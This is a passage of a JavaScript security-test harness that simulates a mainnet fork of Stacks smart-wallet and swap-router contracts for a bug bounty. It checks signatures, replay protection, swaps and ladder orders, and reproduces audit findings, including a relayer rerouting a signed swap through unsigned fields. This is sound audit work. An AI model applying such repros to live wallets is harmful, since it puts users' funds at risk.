// simul-juice-trading.js
// stxer mainnet-fork harness for contracts/juice-trading.clar (pillar-wallets-xyz
// 321f103 + the one-line deploy fix) and the juice-safe-auth-helpers-v3 builders
// it uses (jing-swap, place/withdraw/claim-ladder). Bounty mwvrpx3a633f201e8caa.
// Nothing is broadcast.
//
// Interactive session (one stxer simulation, steps appended and read back one by
// one): every check reads the real fork state.
//
// In-fork deploys, all as SPV9K21... (the names the safe hardcodes):
//   juice-safe-auth-helpers-v3 (Clarity 4), swap-router-sbtc-stx-jing-v6-1
//   (Clarity 5, jing-contracts-v3 d2f6cad bytes), juice-trading (Clarity 6, the
//   fixed repo file). Also 321f103's unfixed juice-trading under another name, to
//   show the deploy blocker on the real VM.
// Everything else (routers sbtc-usdcx v5-6 / stx-usdcx v6, the 3 ladder
// dispatchers + rungs, auth helpers v7 / smart-execute / mm-safe, fakfun-core-v2,
// gas-station, wallet-core-v2) is live mainnet code.
//
// Groups:
//   A deploy + onboard
//   B helpers-v3: JS hash == on-chain hash for every new builder; each signed
//     field mutated -> u4002; replay -> u4006; the unsigned fields are listed
//   C jing-swap: 6 directions, admin and passkey (gas on some), DLMM legs
//     (keyless); split mismatch u3004, min-out u3002, bad action u4024,
//     stranger u4001, token lock u4019 on the passkey path only
//   D ladders on all 3 pairs, both sides: place -> withdraw (all assets back) ->
//     claim; passkey + gas on each function; dispatcher refusals
//   E wiring of the v19 functions: auth, registry gate, gas, lock
//   F FINDING repros (triage #2, #3, #4): the expected result is the bug
//
// Run:   STACKS_NODE=https://api.hiro.so node simul-juice-trading.js
//        (default node = the juice box; Hiro works when it is down)
import crypto from "node:crypto";
import fs from "node:fs";
import { execSync } from "node:child_process";
import {
  tupleCV, uintCV, intCV, bufferCV, noneCV, someCV, trueCV, falseCV, boolCV, listCV,
  principalCV, standardPrincipalCV, contractPrincipalCV, stringAsciiCV,
  serializeCV, deserializeCV, cvToString, getAddressFromPrivateKey,
  makeUnsignedContractDeploy, makeUnsignedSTXTokenTransfer, PostConditionMode,
} from "@stacks/transactions";
import { SimulationBuilder, submitSimulationSteps, callContract, getNonce, setSender } from "stxer";
import { generateP256Keypair, signChallengeWithRpId } from "./lib-webauthn-test-signer.mjs";

const NODE = process.env.STACKS_NODE || "http://77.42.3.101/stacks-api";
const D = "SPV9K21TBFAK4KNRJXF5DFP8N7W46G4V9RCJDC22";
const FAKFUN_DEPLOYER = "SP28MP1HQDJWQAFSQJN2HBAXBVP7H7THD1W2NYZVK";
const OWNER = "SP2C7BCAP2NH3EYWCCVHJ6K0DMZBXDFKQ56KR7QN2"; // admin + sBTC whale
const RECOVERY = "SP3HXJJMJQ06GNAZ8XWDN1QM48JEDC6PP6W3YZPZJ";
const STX_WHALE = "SP354663MXNWN2B6HKNBYD8JBNJK2ZNBZE764X1RR";
const mk = (n) => getAddressFromPrivateKey(String(n).repeat(64).slice(0, 64) + "01", "mainnet");
const RELAYER = mk(3), STRANGER = mk(4), ATTACKER = mk(5);
const SBTC = "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token";
const USDCX = "SP120SBRBQJ00MCWS7TM5R8WJNTTKD5K0HFRC2CNE.usdcx";
const SAFE_NAME = "juice-trading";
const SAFE = `${D}.${SAFE_NAME}`;
const H3 = `${D}.juice-safe-auth-helpers-v3`;
const R_SS = `${D}.swap-router-sbtc-stx-jing-v6-1`;
const R_SU = `${D}.swap-router-sbtc-usdcx-jing-v6`;
const R_TU = `${D}.swap-router-stx-usdcx-jing-v6`;
const WALLET_CORE = `${D}.fakfun-wallet-core-v2`;
const GAS = `${D}.gas-station`;
const VELAR_POOL = "SP20X3DC5R091J8B6YPQT638J8NR1W83KN6TN5BJY.univ2-pool-v1_0_0-0070";
const RP_ID = "juiceofbtc.com";
const LADDER = {
  "sbtc-stx": { buy: (b) => `jing-buy-stx-${b}-v2`, sell: (b) => `jing-sell-stx-${b}-v2`, buyMin: 100n, sellMin: 100_000n },
  "sbtc-usdcx": { buy: (b) => `jing-buy-sbtc-${b}-v2`, sell: (b) => `jing-sell-sbtc-${b}-v2`, buyMin: 100_000n, sellMin: 100n },
  "stx-usdcx": { buy: (b) => `jing-buy-stx-usdc-${b}`, sell: (b) => `jing-sell-stx-usdc-${b}`, buyMin: 100_000n, sellMin: 100_000n },
};
const UMAX = 340282366920938463463374607431768211455n;

const STX_THRESHOLD = 100_000_000n, SBTC_THRESHOLD = 100_000n, COOLDOWN = 144n;
const FUND_STX = 3_000_000_000n, FUND_SBTC = 8_000_000n;

// ---------------------------------------------------------------------------
// session plumbing (after jing-contracts-v3/simulations/_yg-loop-common.js)
const S = { sid: null, passed: 0, checks: 0, group: "", groups: {}, fails: [], notes: [], findings: [] };
class Stop extends Error {}
function plain(c) {
  switch (c.type) {
    case "uint": case "int": return BigInt(c.value);
    case "true": return true; case "false": return false;
    case "none": return null; case "some": return plain(c.value);
    case "ok": return { ok: plain(c.value) }; case "err": return { err: plain(c.value) };
    case "tuple": return Object.fromEntries(Object.entries(c.value).map(([k, v]) => [k, plain(v)]));
    case "list": return c.value.map(plain);
    default: return c.value;
  }
}
const show = (v) => JSON.stringify(v, (k, x) => (typeof x === "bigint" ? `u${x}` : x));
const group = (g) => { S.group = g; console.log(`\n=== ${g} ===`); };
function check(label, ok, detail = "") {
  S.checks++; S.groups[S.group] ??= [0, 0]; S.groups[S.group][1]++;
  if (ok) { S.passed++; S.groups[S.group][0]++; } else S.fails.push(`${S.checks}. [${S.group}] ${label}: ${String(detail).slice(0, 400)}`);
  console.log(`${ok ? "ok  " : "FAIL"} ${S.checks}. ${label}${detail ? `: ${String(detail).slice(0, 500)}` : ""}`);
  return ok;
}
function must(label, ok, detail = "") { if (!check(label, ok, detail)) throw new Stop(`STOP at check ${S.checks} (${label})`); }
const note = (s) => { S.notes.push(s); console.log(`  note: ${s}`); };
const finding = (s) => { S.findings.push(`check ${S.checks}: ${s}`); console.log(`  FINDING: ${s}`); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function retry(fn) {
  for (let i = 0; ; i++) {
    try { return await fn(); } catch (e) {
      const m = String(e?.message ?? e);
      if (i < 8 && /ECONNRESET|fetch failed|socket hang|timed? ?out|\b(502|503|504|520|522|524|429)\b|ETIMEDOUT|EAI_AGAIN/i.test(m)) { await sleep(5000 * (i + 1)); continue; }
      throw e;
    }
  }
}
async function evalIn(cid, code) {
  const out = await retry(() => submitSimulationSteps(S.sid, { steps: [{ TenureExtend: { cause: "Extended" } }, { Eval: [D, "", cid, code] }] }));
  const r = out.steps[1];
  if (!r?.Eval || !("Ok" in r.Eval)) throw new Error(`eval failed in ${cid}: ${JSON.stringify(r).slice(0, 300)} :: ${code.slice(0, 200)}`);
  return plain(deserializeCV(r.Eval.Ok));
}
async function call(sender, cid, fn, args) {
  await retry(() => submitSimulationSteps(S.sid, { steps: [{ TenureExtend: { cause: "Extended" } }] }));
  const r = await retry(() => callContract(S.sid, { sender, contract: cid, functionName: fn, functionArgs: args, fee: 0 }));
  let res = null;
  try { res = r.resultHex ? plain(deserializeCV(r.resultHex)) : null; } catch { res = null; }
  return { res, receipt: r.receipt, vm: r.vmError || r.pcAborted ? { vm: r.vmError, pc: r.pcAborted } : null };
}
const E = (n) => (v) => v?.err === BigInt(n);
const OK = (v) => v?.ok !== undefined;
async function tx(label, sender, cid, fn, args, want) {
  const r = await call(sender, cid, fn, args);
  const ok = !r.vm && (typeof want === "function" ? want(r.res) : show(r.res) === show(want));
  check(label, ok, r.vm ? `VM ${show(r.vm)}` : show(r.res));
  return r;
}
async function stxTransfer(from, to, amount) {
  const raw = await makeUnsignedSTXTokenTransfer({ recipient: to, amount, nonce: await retry(() => getNonce(S.sid, from)), network: "mainnet", publicKey: "", fee: 0 });
  setSender(raw, from);
  const out = await retry(() => submitSimulationSteps(S.sid, { steps: [{ Transaction: raw.serialize() }] }));
  const t = out.steps[0]?.Transaction?.Ok;
  must(`fund ${to.split(".").pop()} ${amount} uSTX`, t && !t.vm_error && cvToString(deserializeCV(t.result)) === "(ok true)", JSON.stringify(out.steps[0]).slice(0, 300));
}
async function sbtcTransfer(from, to, amount) {
  const r = await call(from, SBTC, "transfer", [uintCV(amount), P_(from), P_(to), noneCV()]);
  must(`fund ${to.split(".").pop()} ${amount} sats`, !r.vm && r.res?.ok === true, show(r.res ?? r.vm));
}
// raw deploy; returns { ok, detail }
async function deployRaw(sender, name, code, clarityVersion) {
  const raw = await makeUnsignedContractDeploy({ contractName: name, codeBody: code, clarityVersion, nonce: await retry(() => getNonce(S.sid, sender)), network: "mainnet", publicKey: "", fee: 0, postConditionMode: PostConditionMode.Allow });
  setSender(raw, sender);
  const out = await retry(() => submitSimulationSteps(S.sid, { steps: [{ Transaction: raw.serialize() }] }));
  const st = out.steps[0];
  const t = st?.Transaction?.Ok;
  const ok = !!t && !t.vm_error && cvToString(deserializeCV(t.result)).startsWith("(ok");
  return { ok, detail: JSON.stringify(st) };
}
const P_ = (s) => (s.includes(".") ? contractPrincipalCV(...s.split(".")) : standardPrincipalCV(s));

// balances
const sb = async (w) => (await evalIn(SBTC, `(get-balance '${w})`)).ok;
const ux = async (w) => (await evalIn(USDCX, `(get-balance '${w})`)).ok;
const st = async (w) => evalIn(SBTC, `(stx-get-balance '${w})`);
const bals = async (w) => ({ stx: await st(w), sbtc: await sb(w), usdcx: await ux(w) });

// ---------------------------------------------------------------------------
// SIP-018 / WebAuthn
const PREFIX = Buffer.from("534950303138", "hex");
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();
const hex = (x) => (typeof x === "string" ? x.replace(/^0x/, "") : Buffer.from(x).toString("hex"));
const cvHash = (cv) => sha256(Buffer.from(hex(serializeCV(cv)), "hex"));
const domain = (wallet) => cvHash(tupleCV({ name: stringAsciiCV("smart-wallet-standard"), version: stringAsciiCV("1.0.0"), "chain-id": uintCV(1), wallet: principalCV(wallet) }));
const msgHash = (wallet, t) => sha256(Buffer.concat([PREFIX, domain(wallet), cvHash(t)]));

const KEY = generateP256Keypair();
const KEY2 = generateP256Keypair(); // never registered
const sigAuth = (authId, hash, key = KEY) => {
  const s = signChallengeWithRpId(hash, key.privKey, RP_ID);
  return someCV(tupleCV({
    "auth-id": uintCV(authId),
    pubkey: bufferCV(Buffer.from(hex(key.pubKeyHex), "hex")),
    signature: bufferCV(Buffer.from(hex(s.signatureHex), "hex")),
    "authenticator-data": bufferCV(Buffer.from(hex(s.authenticatorDataHex), "hex")),
    "client-data-prefix": bufferCV(Buffer.from(hex(s.clientDataPrefixHex), "hex")),
    "client-data-suffix": bufferCV(Buffer.from(hex(s.clientDataSuffixHex), "hex")),
  }));
};
let AUTH = 1000;
const nextAuth = () => AUTH++;

// helpers-v3 message tuples (mirrors juice-safe-auth-helpers-v3.clar)
const T3 = {
  jingSwap: (a, action, amount, limit, minOut) => tupleCV({ topic: stringAsciiCV("jing-swap"), "auth-id": uintCV(a), action: stringAsciiCV(action), amount: uintCV(amount), "limit-price": uintCV(limit), "min-out": uintCV(minOut) }),
  place: (a, pair, buy, total, allocs) => tupleCV({ topic: stringAsciiCV("place-ladder"), "auth-id": uintCV(a), pair: stringAsciiCV(pair), buy: boolCV(buy), total: uintCV(total), allocations: listCV(allocs.map((x) => tupleCV({ rung: principalCV(x.rung), amount: uintCV(x.amount) }))) }),
  withdraw: (a, pair, buy, reqs) => tupleCV({ topic: stringAsciiCV("withdraw-ladder"), "auth-id": uintCV(a), pair: stringAsciiCV(pair), buy: boolCV(buy), requests: listCV(reqs.map((x) => tupleCV({ rung: principalCV(x.rung), amount: uintCV(x.amount) }))) }),
  claim: (a, pair, buy, rungs) => tupleCV({ topic: stringAsciiCV("claim-ladder"), "auth-id": uintCV(a), pair: stringAsciiCV(pair), buy: boolCV(buy), rungs: listCV(rungs.map((r) => principalCV(r))) }),
  stake: (a, amt, pool, cd) => tupleCV({ topic: stringAsciiCV("stake-stx-juice-pool"), "auth-id": uintCV(a), "amount-ustx": uintCV(amt), pool: principalCV(pool), "signer-calldata": cd }),
  update: (a, inc, ext, pool, cd) => tupleCV({ topic: stringAsciiCV("update-stake-stx-juice-pool"), "auth-id": uintCV(a), "amount-increase": uintCV(inc), "cycles-to-extend": uintCV(ext), pool: principalCV(pool), "signer-calldata": cd }),
};
// Clarity literal of a tuple list for the on-chain builders
const allocLit = (xs) => `(list ${xs.map((x) => `{ rung: '${x.rung}, amount: u${x.amount} }`).join(" ")})`;
// on-chain hash, evaluated in the safe's context (helper domain = contract-caller = safe)
const chainHash = async (helper, fn, lit) => hex(await evalIn(SAFE, `(contract-call? '${helper} ${fn} ${lit})`));

// ---------------------------------------------------------------------------
// router args
const amm4 = (o = {}) => tupleCV({ zest: uintCV(o.zest ?? 0n), dlmm: uintCV(o.dlmm ?? 0n), xyk: uintCV(o.xyk ?? 0n), velar: uintCV(o.velar ?? 0n) });
const ZR0 = tupleCV({ ticks: listCV([]), price: uintCV(0) });
// jing-swap args; o = { amount, jing, limit, update, fallback, amts, mins, minOut, zr }
const jsArgs = (action, o, sa = noneCV(), gas = noneCV()) => [
  stringAsciiCV(action), uintCV(o.amount), uintCV(o.jing ?? 0n), uintCV(o.limit ?? 1n),
  o.update ? someCV(bufferCV(o.update)) : noneCV(), o.fallback != null ? someCV(uintCV(o.fallback)) : noneCV(),
  amm4(o.amts ?? { dlmm: o.amount }), amm4(o.mins ?? {}), uintCV(o.minOut ?? 1n), o.zr ?? ZR0, sa, gas,
];
const GASCV = () => someCV(P_(GAS));
const prints = (receipt) => (receipt?.events ?? []).map((e) => (typeof e === "string" ? JSON.parse(e) : e))
  .filter((e) => e.committed !== false && e.contract_event)
  .map((e) => { try { return { c: e.contract_event.contract_identifier, v: plain(deserializeCV(e.contract_event.raw_value)) }; } catch { return null; } })
  .filter(Boolean);
const routerPrint = (r, topic) => prints(r.receipt).find((p) => p.v?.topic === topic)?.v;

// ---------------------------------------------------------------------------
async function main() {
  // deploy bytes = the faktory-dao templates; all five are LIVE on mainnet
  // since 2026-11-27 with exactly these bytes (checked below), so the harness
  // uses the live contracts instead of fork-deploying them.
  const tpl = (n) => { const t = fs.readFileSync(`${process.env.HOME}/projects/faktory-dao/backend/server/utils/${n}-template.ts`, "utf8"); return t.slice(t.indexOf("= `") + 3, t.lastIndexOf("`")); };
  const fixedSrc = tpl("juice-trading");
  const origSrc = execSync("git show 321f103:contracts/juice-trading.clar", { encoding: "utf8" });
  const h3Src = tpl("juice-safe-auth-helpers-v3");
  const JING = `${process.env.HOME}/projects/jing-contracts-v3`;
  const v61Src = tpl("swap-router-sbtc-stx-jing-v6-1");
  const su6Src = tpl("swap-router-sbtc-usdcx-jing-v6");
  for (const [n, want] of [["juice-trading", fixedSrc], ["juice-safe-auth-helpers-v3", h3Src], ["swap-router-sbtc-stx-jing-v6-1", v61Src], ["swap-router-sbtc-usdcx-jing-v6", su6Src]]) {
    const live = (await (await fetch(`${NODE}/v2/contracts/source/${D}/${n}?proof=0`)).json()).source;
    if (live !== want) throw new Error(`${n}: live bytes differ from the template`);
  }
  console.log("live juice-trading, helpers-v3, router v6-1, sbtc-usdcx v6 == faktory-dao templates");
  const mockSmart = fs.readFileSync("contracts/mock-smart-router.clar", "utf8");
  const sha = (s) => crypto.createHash("sha256").update(s).digest("hex");
  console.log(`node ${NODE}`);
  console.log(`juice-trading fixed sha256 ${sha(fixedSrc)}  (321f103 ${sha(origSrc)})`);
  console.log(`helpers-v3 sha256 ${sha(h3Src)}   router v6-1 (d2f6cad) sha256 ${sha(v61Src)}`);
  console.log(`passkey ${KEY.pubKeyHex}`);

  const b = SimulationBuilder.new({ stacksNodeAPI: NODE });
  if (process.env.FORK_BLOCK) b.useBlockHeight(Number(process.env.FORK_BLOCK));
  b.withSender(D).addEvalCode(SBTC, "(get-balance-available 'SP2C7BCAP2NH3EYWCCVHJ6K0DMZBXDFKQ56KR7QN2)");
  S.sid = await retry(() => b.run());
  console.log(`View: https://stxer.xyz/simulations/mainnet/${S.sid}`);

  // =========================================================================
  group("A deploy + onboard");
  {
    check("live helpers-v3 / router v6-1 / sbtc-usdcx v6 / juice-trading == templates (JS byte compare)", true);
    const o = await deployRaw(D, "juice-trading-321f103", origSrc, 6);
    check("FINDING #1 repro: 321f103 juice-trading does NOT deploy: 'trait reference expected' (rung-entry contract-of on a tuple field)", !o.ok && /trait reference expected/i.test(o.detail), o.detail.slice(o.detail.indexOf("vm_error"), o.detail.indexOf("vm_error") + 200));
    if (!o.ok) finding("#1 juice-trading @321f103 fails to deploy on the real VM (rung-entry `(contract-of (get rung a))`); fixed copy deploys");
    check("live juice-trading not onboarded yet (owner SP000...)", (await evalIn(SAFE, "(get-owner)")).ok === "SP000000000000000000002Q6VF78");
    const r4 = await deployRaw(D, "mock-smart-router-jt", mockSmart, 4);
    must("deploy mock-smart-router-jt (unregistered smart router)", r4.ok, r4.detail);
  }
  await tx("core-v2 set-verified-contract(juice-trading)", D, WALLET_CORE, "set-verified-contract", [principalCV(SAFE), noneCV()], OK);
  await tx("onboard by a stranger -> u4001", STRANGER, SAFE, "onboard",
    [bufferCV(Buffer.from(KEY.pubKeyHex, "hex")), standardPrincipalCV(OWNER), someCV(standardPrincipalCV(RECOVERY)), uintCV(STX_THRESHOLD), uintCV(SBTC_THRESHOLD), uintCV(COOLDOWN)], E(4001));
  await tx("onboard (fakfun deployer): passkey, OWNER admin, RECOVERY, 100 STX / 100k sats / 144", FAKFUN_DEPLOYER, SAFE, "onboard",
    [bufferCV(Buffer.from(KEY.pubKeyHex, "hex")), standardPrincipalCV(OWNER), someCV(standardPrincipalCV(RECOVERY)), uintCV(STX_THRESHOLD), uintCV(SBTC_THRESHOLD), uintCV(COOLDOWN)], OK);
  await tx("onboard twice -> u4001", FAKFUN_DEPLOYER, SAFE, "onboard",
    [bufferCV(Buffer.from(KEY.pubKeyHex, "hex")), standardPrincipalCV(OWNER), noneCV(), uintCV(1), uintCV(1), uintCV(COOLDOWN)], E(4001));
  check("get-owner = OWNER", (await evalIn(SAFE, "(get-owner)")).ok === OWNER);
  check("passkey registered (is-admin-pubkey ok)", OK(await evalIn(SAFE, `(is-admin-pubkey 0x${KEY.pubKeyHex})`)));
  await stxTransfer(STX_WHALE, SAFE, FUND_STX);
  await sbtcTransfer(OWNER, SAFE, FUND_SBTC);
  for (const w of [RELAYER, STRANGER, ATTACKER]) await stxTransfer(STX_WHALE, w, 50_000_000n);
  const GAS_FEE = await evalIn(GAS, "(get-gas)");
  console.log(`  gas-station fee ${show(GAS_FEE)} sats`);
  const gasFee = typeof GAS_FEE === "bigint" ? GAS_FEE : GAS_FEE?.ok;

  // =========================================================================
  group("B helpers-v3 hashes + signed-field binding");
  {
    const rung = (p, side, bps) => `${D}.${LADDER[p][side](bps)}`;
    const allocs = [{ rung: rung("sbtc-stx", "buy", 1), amount: 1000n }, { rung: rung("sbtc-stx", "buy", 10), amount: 2000n }];
    const cases = [
      ["build-jing-swap-hash", `{ auth-id: u7, action: "sbtc-stx", amount: u12345, limit-price: u777, min-out: u999 }`, T3.jingSwap(7, "sbtc-stx", 12345, 777, 999)],
      ["build-place-ladder-hash", `{ auth-id: u8, pair: "sbtc-stx", buy: true, total: u3000, allocations: ${allocLit(allocs)} }`, T3.place(8, "sbtc-stx", true, 3000, allocs)],
      ["build-withdraw-ladder-hash", `{ auth-id: u9, pair: "sbtc-stx", buy: true, requests: ${allocLit(allocs)} }`, T3.withdraw(9, "sbtc-stx", true, allocs)],
      ["build-claim-ladder-hash", `{ auth-id: u10, pair: "sbtc-stx", buy: false, rungs: (list '${allocs[0].rung} '${allocs[1].rung}) }`, T3.claim(10, "sbtc-stx", false, allocs.map((x) => x.rung))],
      ["build-stake-stx-juice-pool-hash", `{ auth-id: u11, amount-ustx: u5, pool: '${D}.juice-pool-sbtc-signer, signer-calldata: (some 0x7465) }`, T3.stake(11, 5, `${D}.juice-pool-sbtc-signer`, someCV(bufferCV(Buffer.from("te"))))],
      ["build-update-stake-stx-juice-pool-hash", `{ auth-id: u12, amount-increase: u0, cycles-to-extend: u0, pool: '${D}.juice-pool-sbtc-signer, signer-calldata: none }`, T3.update(12, 0, 0, `${D}.juice-pool-sbtc-signer`, noneCV())],
    ];
    for (const [fn, lit, t] of cases) {
      const on = await chainHash(H3, fn, lit), js = msgHash(SAFE, t).toString("hex");
      check(`${fn}: JS == on-chain (${on.slice(0, 16)}…)`, on === js, `chain ${on} js ${js}`);
    }
    const domChain = hex(await evalIn(SAFE, `(contract-call? '${H3} get-domain-hash)`));
    check("domain hash binds the safe (contract-caller)", domChain === domain(SAFE).toString("hex"), domChain);
  }
  // jing-swap: sign one intent, mutate each signed field (u4002), then run it, replay (u4006)
  {
    const base = { amount: 20_000n, limit: 1n, minOut: 1n };
    const a = nextAuth();
    const sa = sigAuth(a, msgHash(SAFE, T3.jingSwap(a, "sbtc-stx", base.amount, base.limit, base.minOut)));
    const muts = [
      ["action stx-sbtc", "stx-sbtc", base],
      ["amount +1", "sbtc-stx", { ...base, amount: base.amount + 1n, amts: { dlmm: base.amount + 1n } }],
      ["limit-price +1", "sbtc-stx", { ...base, limit: 2n }],
      ["min-out 0", "sbtc-stx", { ...base, minOut: 0n }],
    ];
    for (const [l, act, o] of muts) await tx(`jing-swap signed field mutated (${l}) -> u4002`, RELAYER, SAFE, "jing-swap", jsArgs(act, o, sa), E(4002));
    // auth-id is signed too: same sig with another auth-id in the tuple
    {
      const s2 = signChallengeWithRpId(msgHash(SAFE, T3.jingSwap(a, "sbtc-stx", base.amount, base.limit, base.minOut)), KEY.privKey, RP_ID);
      const bad = someCV(tupleCV({ "auth-id": uintCV(a + 1), pubkey: bufferCV(Buffer.from(KEY.pubKeyHex, "hex")), signature: bufferCV(Buffer.from(hex(s2.signatureHex), "hex")), "authenticator-data": bufferCV(Buffer.from(hex(s2.authenticatorDataHex), "hex")), "client-data-prefix": bufferCV(Buffer.from(hex(s2.clientDataPrefixHex), "hex")), "client-data-suffix": bufferCV(Buffer.from(hex(s2.clientDataSuffixHex), "hex")) }));
      await tx("jing-swap signed field mutated (auth-id +1) -> u4002", RELAYER, SAFE, "jing-swap", jsArgs("sbtc-stx", base, bad), E(4002));
    }
    await tx("jing-swap signed by an unregistered passkey -> u4004/u4002", RELAYER, SAFE, "jing-swap", jsArgs("sbtc-stx", base, sigAuth(a, msgHash(SAFE, T3.jingSwap(a, "sbtc-stx", base.amount, base.limit, base.minOut)), KEY2)), (v) => v?.err === 4004n || v?.err === 4002n || v?.err === 4005n);
    // unsigned: split / jing-amount / fallback / update / zest-route. The relayer moves the split from DLMM to XYK: accepted.
    const before = await bals(SAFE);
    const r = await tx("jing-swap UNSIGNED split changed by the relayer (signed DLMM intent sent as XYK) -> accepted", RELAYER, SAFE, "jing-swap",
      jsArgs("sbtc-stx", { ...base, amts: { xyk: base.amount } }, sa), OK);
    const p = routerPrint(r, "swap-sbtc-for-stx");
    check("  router print: all 20,000 sats went to XYK (the venue the signer did not pick)", p?.["xyk-in"] === base.amount && p?.["dlmm-in"] === 0n, show(p));
    const after = await bals(SAFE);
    check("  safe paid exactly 20,000 sats", before.sbtc - after.sbtc === base.amount, show({ before, after }));
    note("helpers-v3 build-jing-swap-hash signs {auth-id, action, amount, limit-price, min-out}; jing-amount, update, fallback, amm-amounts, amm-mins and zest-route are unsigned (triage #3)");
    await tx("jing-swap replayed (same signature) -> u4006", RELAYER, SAFE, "jing-swap", jsArgs("sbtc-stx", base, sa), E(4006));
  }

  // =========================================================================
  group("C jing-swap 6 directions (DLMM legs, keyless)");
  // stx-usdcx first so the safe has USDCx for the usdcx-* directions
  const DIRS = [
    ["stx-usdcx", R_TU, "swap-stx-for-usdcx", 30_000_000n, "stx", "usdcx"],
    ["usdcx-stx", R_TU, "swap-usdcx-for-stx", 1_000_000n, "usdcx", "stx"],
    ["sbtc-stx", R_SS, "swap-sbtc-for-stx", 20_000n, "sbtc", "stx"],
    ["stx-sbtc", R_SS, "swap-stx-for-sbtc", 20_000_000n, "stx", "sbtc"],
    ["sbtc-usdcx", R_SU, "swap-sbtc-for-usdcx", 20_000n, "sbtc", "usdcx"],
    ["usdcx-sbtc", R_SU, "swap-usdcx-for-sbtc", 1_000_000n, "usdcx", "sbtc"],
  ];
  for (const [action, router, topic, amount, inA, outA] of DIRS) {
    for (const path of ["admin", "passkey"]) {
      const gas = path === "passkey" && (action === "sbtc-stx" || action === "usdcx-stx") ? GASCV() : noneCV();
      const before = await bals(SAFE);
      let sa = noneCV(), sender = OWNER;
      if (path === "passkey") { const a = nextAuth(); sa = sigAuth(a, msgHash(SAFE, T3.jingSwap(a, action, amount, 1n, 1n))); sender = RELAYER; }
      const r = await tx(`${action} ${path}${gas.type === "some" || gas.type === 10 || gas.value ? " + gas" : ""}: ${amount} ${inA}`, sender, SAFE, "jing-swap", jsArgs(action, { amount }, sa, gas), OK);
      const after = await bals(SAFE);
      const p = routerPrint(r, topic) ?? prints(r.receipt).find((x) => x.c === router && typeof x.v === "object" && x.v.out !== undefined)?.v;
      const gasPaid = gas.type !== undefined && gas.value ? gasFee : 0n;
      const spent = before[inA] - after[inA] - (inA === "sbtc" ? gasPaid : 0n);
      const unsold = p?.unsold ?? 0n;
      check(`  ${action}: safe spent amount - unsold (${amount} - ${unsold}), got ${outA} = router out`,
        p && spent === amount - unsold && after[outA] - before[outA] + (outA === "sbtc" ? gasPaid : 0n) === p.out && p.out > 0n, show({ spent, unsold, out: p?.out, d: after[outA] - before[outA] }));
      if (gasPaid) check(`  gas: safe paid ${gasFee} sats to the station`, before.sbtc - after.sbtc - (inA === "sbtc" ? amount - unsold : 0n) + (outA === "sbtc" ? p.out : 0n) === gasFee);
      const rb = await bals(router);
      check(`  router ${router.split(".")[1]} holds nothing`, rb.stx === 0n && rb.sbtc === 0n && rb.usdcx === 0n, show(rb));
    }
  }
  {
    const a = 50_000n;
    await tx("jing-swap stranger (no sig) -> u4001", STRANGER, SAFE, "jing-swap", jsArgs("sbtc-stx", { amount: a }), E(4001));
    await tx("jing-swap bad action -> u4024", OWNER, SAFE, "jing-swap", jsArgs("btc-eth", { amount: a }), E(4024));
    await tx("jing-swap split mismatch (dlmm = amount + 1) -> router u3004", OWNER, SAFE, "jing-swap", jsArgs("sbtc-stx", { amount: a, amts: { dlmm: a + 1n } }), E(3004));
    await tx("jing-swap min-out above fill -> router u3002", OWNER, SAFE, "jing-swap", jsArgs("sbtc-stx", { amount: a, minOut: 10n ** 15n }), E(3002));
    const bal = await sb(SAFE);
    // router v6-1 lets the DLMM leg fill in part: with thin bins it sells less than the
    // safe holds and returns ok with the rest unsold, so the call may pass; either way
    // the safe can never send more than it holds. Refill after, so later groups keep their budget.
    await tx("jing-swap amount > safe sBTC balance -> refused, or partial fill within the balance", OWNER, SAFE, "jing-swap", jsArgs("sbtc-stx", { amount: bal + 1n }), (v) => v?.err !== undefined || v?.ok === true);
    { const left = await sb(SAFE); check("  safe never sent more than it held", left >= 0n && left <= bal); if (bal > left) await sbtcTransfer(OWNER, SAFE, bal - left); }
    // token lock: passkey refused, admin still allowed
    await tx("admin toggle-token-lock true", OWNER, SAFE, "toggle-token-lock", [trueCV(), noneCV(), noneCV()], OK);
    const ai = nextAuth();
    await tx("token lock on: passkey jing-swap -> u4019", RELAYER, SAFE, "jing-swap", jsArgs("sbtc-stx", { amount: 10_000n }, sigAuth(ai, msgHash(SAFE, T3.jingSwap(ai, "sbtc-stx", 10_000n, 1n, 1n)))), E(4019));
    await tx("token lock on: admin jing-swap still runs", OWNER, SAFE, "jing-swap", jsArgs("sbtc-stx", { amount: 10_000n }), OK);
    await tx("admin toggle-token-lock false", OWNER, SAFE, "toggle-token-lock", [falseCV(), noneCV(), noneCV()], OK);
  }

  // =========================================================================
  group("D ladders (3 pairs x buy/sell): place -> withdraw -> claim");
  {
    const assetOf = { "sbtc-stx": { buy: "sbtc", sell: "stx" }, "sbtc-usdcx": { buy: "usdcx", sell: "sbtc" }, "stx-usdcx": { buy: "usdcx", sell: "stx" } };
    for (const pair of Object.keys(LADDER)) {
      for (const side of ["buy", "sell"]) {
        const buy = side === "buy";
        const asset = assetOf[pair][side];
        const min = buy ? LADDER[pair].buyMin : LADDER[pair].sellMin;
        const rungs = [1, 10].map((bps) => `${D}.${LADDER[pair][side](bps)}`);
        const reg = await evalIn(`${D}.${pair === "sbtc-stx" ? "jing-ladder-v1" : pair === "sbtc-usdcx" ? "jing-ladder-sbtc-usdcx-v1" : "jing-ladder-stx-usdcx-v1"}`, `(get-registered '${rungs[0]})`);
        check(`${pair} ${side}: ${rungs[0].split(".")[1]} registered as ${buy ? "buy-band" : "sel-band"}`, reg?.side === (buy ? "buy-band" : "sel-band"), show(reg));
        const amt = min * 3n;
        const allocs = rungs.map((r) => ({ rung: r, amount: amt }));
        const total = amt * 2n;
        const passkey = (pair === "sbtc-stx") || (pair === "stx-usdcx" && !buy); // passkey + gas on 2 of the 6 sides, admin on the rest
        const before = await bals(SAFE);
        let sa = noneCV(), sender = OWNER, gas = noneCV();
        if (passkey) { const a = nextAuth(); sa = sigAuth(a, msgHash(SAFE, T3.place(a, pair, buy, total, allocs))); sender = RELAYER; gas = GASCV(); }
        const allocCV = listCV(allocs.map((x) => tupleCV({ rung: P_(x.rung), amount: uintCV(x.amount) })));
        // dispatcher refusals first (admin)
        if (pair === "sbtc-stx" && buy) {
          await tx("place-ladder total != sum -> dispatcher u7102", OWNER, SAFE, "place-ladder", [stringAsciiCV(pair), trueCV(), uintCV(total + 1n), allocCV, noneCV(), noneCV()], E(7102));
